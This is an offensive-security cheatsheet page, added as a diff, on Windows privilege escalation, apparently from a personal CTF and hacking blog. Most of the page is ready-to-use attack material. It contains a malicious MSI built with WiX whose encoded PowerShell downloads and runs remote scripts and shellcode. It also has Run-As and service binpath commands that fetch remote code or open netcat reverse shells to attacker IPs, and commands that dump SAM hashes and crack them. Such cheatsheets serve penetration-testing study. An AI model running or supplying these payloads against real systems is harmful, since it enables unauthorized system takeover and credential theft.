@@ -1,0 +1,96 @@
+<head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Windows</title><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></head><header><div id=brand><a class=icon-link href=https://ceso.github.io/><img class=icon src=https://ceso.github.io/images/site/logo.svg></a><div class=text><a href=https://ceso.github.io/ class=site-title>Ceso Adventures</a><h3>Blogs, Security CTFs & Tutorials</h3></div></div><nav><a href=https://ceso.github.io/><b>Home</b></a>
+|
+<a href=https://ceso.github.io/whoami/><b>Whoami</b></a>
+|
+<a href=https://ceso.github.io/posts/><b>Posts</b></a>
+|
+<a href=https://ceso.github.io/cheatsheets/><b>Cheatsheets</b></a>
+|
+<a href=https://ceso.github.io/resources><b>Resources</b></a>
+|
+<a href=https://ceso.github.io/videos><b>Videos</b></a>
+|
+<a href=https://ceso.github.io/categories/><b>Categories</b></a>
+|
+<a href=https://ceso.github.io/tags/><b>Tags</b></a>
+|
+<a href=https://ceso.github.io/index.xml><b>RSS</b></a></nav><hr></header><div class=wrap><nav class=sidebar aria-label="Table of contents"><h2>Cheatsheets</h2><details open><summary>Hacking</summary><div class=children><details><summary>Active Directory</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/bloodhound/>BloodHound
+</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/exploitation/>Exploitation
+</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/permissions/>Permissions: ACE/SDDL - Format
+</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/powerview/>PowerView - methods for enumeration</a></div></details><details><summary>Antivirus Bypassing</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/readme/>README !
+</a><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/amsi/>AMSI
+</a><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/signature_heuristics/>Signature/Heuristics</a></div></details><details><summary>Enumeration</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/login_cifs_winrm_pssesion/>Login through CIFS/WinRM/PSSession
+</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/networking/>Networking
+</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/samba/>Samba
+</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/useful_wordlists/>Useful Wordlists
+</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/web_directorie_file_scanner/>Web directorie/file scanner
+</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/windows/>Windows</a></div></details><details><summary>Exfiltration</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/ftp/>FTP
+</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/http/>HTTP
+</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/rdp/>RDP
+</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/samba/>Samba
+</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/sockets/>Sockets</a></div></details><details><summary>Good to know</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/compiling/>Compiling
+</a><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/misc/>Misc
+</a><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/web/>Web</a></div></details><details><summary>Memory Exploitation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/memory_exploitation/simple_buffer_overflow/>(Simple) Buffer Overflow (32 bits, NO ASLR and NO DEP)</a></div></details><details><summary>Pivoting</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/readme/>README !
+</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/chisel/>Chisel
+</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/metasploit/>Metasploit
+</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/sshuttle/>sshuttle</a></div></details><details open><summary>Privilege Escalation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/>Linux
+</a><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/ class=current>Windows</a></div></details><details><summary>Reverse Shells</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/bash/>Bash
+</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/metasploit/>Metasploit
+</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/>PHP</a></div></details></div></details><hr style="border:none;border-top:1px solid rgba(255,255,255,3%);margin:12px 0"><div style=padding:8px;color:#9aa4b2;font-size:13px>I wuv cheese :D</div></nav><main><header class=page-title><h1>Windows</h1></header><article><h1 id=always-install-elevated>Always Install Elevated</h1><p>If we have enabled a privilege which allow us to ALWAYS install with elevated privileges, we can craft a .msi leveranging wixt
+ools, specifically with candl.exe and light.exe.
+The steps are as follows:</p><p>1 - Create a malicious .xml wix file:</p><pre tabindex=0><code class=language-texinfo data-lang=texinfo>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;Wix xmlns=&#34;http://schemas.microsoft.com/wix/2006/wi&#34;&gt;
+    &lt;Product Id=&#34;*&#34; UpgradeCode=&#34;12345678-1234-1234-1234-111111111111&#34; Name=&#34;Example Product Name&#34; Version=&#34;0.0.1&#34; Manufacture
+r=&#34;@_xpn_&#34; Language=&#34;1033&#34;&gt;
+        &lt;Package InstallerVersion=&#34;200&#34; Compressed=&#34;yes&#34; Comments=&#34;Windows Installer Package&#34;/&gt;
+        &lt;Media Id=&#34;1&#34; Cabinet=&#34;product.cab&#34; EmbedCab=&#34;yes&#34;/&gt;
+        &lt;Directory Id=&#34;TARGETDIR&#34; Name=&#34;SourceDir&#34;&gt;
+            &lt;Directory Id=&#34;ProgramFilesFolder&#34;&gt;
+                &lt;Directory Id=&#34;INSTALLLOCATION&#34; Name=&#34;Example&#34;&gt;
+                 &lt;Component Id=&#34;ApplicationFiles&#34; Guid=&#34;12345678-1234-1234-1234-222222222222&#34;&gt;
+                    &lt;/Component&gt;
+                &lt;/Directory&gt;
+            &lt;/Directory&gt;
+        &lt;/Directory&gt;
+        &lt;Feature Id=&#34;DefaultFeature&#34; Level=&#34;1&#34;&gt;
+            &lt;ComponentRef Id=&#34;ApplicationFiles&#34;/&gt;
+        &lt;/Feature&gt;
+        &lt;CustomAction Id=&#34;SystemShell&#34; Directory=&#34;TARGETDIR&#34; ExeCommand=&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+.exe -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAC
+gAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA5ADIALwBuAGkAZQByAGkALgBwAHMAMQAnACkAOwBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBj
+AHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOA
+AuADQAOQAuADkAMgAvAHIAdQBuAC0AcwBoAGUAbABsAGMAbwBkAGUALQA2ADQAYgBpAHQALgBwAHMAMQAtAGYAcgBvAG0AOQAyAC0AOAAwADgAMQBwAG8AcgB0ACcA
+KQAKAA==&#34; Execute=&#34;deferred&#34; Impersonate=&#34;no&#34; Return=&#34;ignore&#34;/&gt;
+        &lt;InstallExecuteSequence&gt;
+            &lt;Custom Action=&#34;SystemShell&#34; After=&#34;InstallInitialize&#34;&gt;&lt;/Custom&gt;
+        &lt;/InstallExecuteSequence&gt;
+    &lt;/Product&gt;
+&lt;/Wix&gt;
+</code></pre><p>The powershell in b64 executed is this one:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>IEX(New-Object Net.Webclient).downloadString(<span style=color:#e6db74>&#39;http://attacker/nieri.ps1&#39;</span>);IEX(New-Object Net.Webclient).downloadString(<span style=color:#e6db74>&#39;http://attacker/run-shellcode-64bit.ps1&#39;</span>)
+</span></span></code></pre></div><p>2 - Create a malicious .wix (this step and next one MUST be run from the path where the wix tools are located)</p><pre tabindex=0><code class=language-texinfo data-lang=texinfo>candle.exe ..\bad-wix-pe.xml -out ..\reverse.wix
+</code></pre><p>3 - Create the malicious .msi from the .wix</p><pre tabindex=0><code class=language-texinfo data-lang=texinfo>light.exe ..\reverse.wix -out ..\vamosvamos.msi
+</code></pre><hr><h1 id=run-as>Run-As</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
+</span></span><span style=display:flex><span>PS C:\&gt; $username = &#34;&lt;domain&gt;\&lt;user&gt;&#34;
+</span></span><span style=display:flex><span>PS C:\&gt; $password = &#39;&lt;password&gt;&#39;
+</span></span><span style=display:flex><span>PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
+</span></span><span style=display:flex><span>PS C:\&gt; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+</span></span><span style=display:flex><span>PS C:\&gt; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+</span></span><span style=display:flex><span>PS C:\&gt; Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString(&#39;http://&lt;ip/host&gt;:&lt;port&gt;/path/to/file.evil&#39;) } -Credential $cred -Computer localhost
+</span></span><span style=display:flex><span>-----------------------------------------------------------------------------------------------------
+</span></span><span style=display:flex><span>Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }
+</span></span></code></pre></div><hr><h1 id=incorrect-permisions-in-services-sc-config-binpath>Incorrect permisions in services (sc config binpath)</h1><p>Binpath is set as running <code>cmd.exe</code> passing a commad to execute to it (so once the process dies, the one executed by it so the command to <code>cmd.exe</code> remains):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>sc config upnphost binpath= &#34;C:\WINDOWS\System32\cmd.exe /k C:\inetpub\wwwroot\nc.exe -nv 192.168.42.42 443 -e C:\WINDOWS\System32\cmd.exe&#34;
+</span></span></code></pre></div><hr><h1 id=sam--system--security>SAM + SYSTEM + Security</h1><p>If those 3 files are in your hands (you could download to your attacker machine), you can dump hashes and crack them:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><hr></article></main></div></body><footer><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></footer><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/ceso target=_blank>GitHub</a>
+|
+<a href=https://youtube.com/c/LeandroLemos target=_blank>YouTube</a>
+|
+<a href=https://twitch.tv/0xc350 target=_blank>Twitch</a></p><p class=copyright>Copyright © 2025
+<a href=https://ceso.github.io/><strong>Ceso</strong></a>.</p><p class=builtWith>Built with
+<a href=http://www.gohugo.io/>Hugo</a> by ceso,
+using <a href=https://github.com/ceso/smigle-lagom>smigle-lagom</a> a fork of the theme
+<a href=https://github.com/joe-mccarthy/smigle-lite>smigle-lite</a>. Based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>,
+which was influenced by the theme
+<a href=https://github.com/colorchestra/smol>smol</a>.</p></footer>
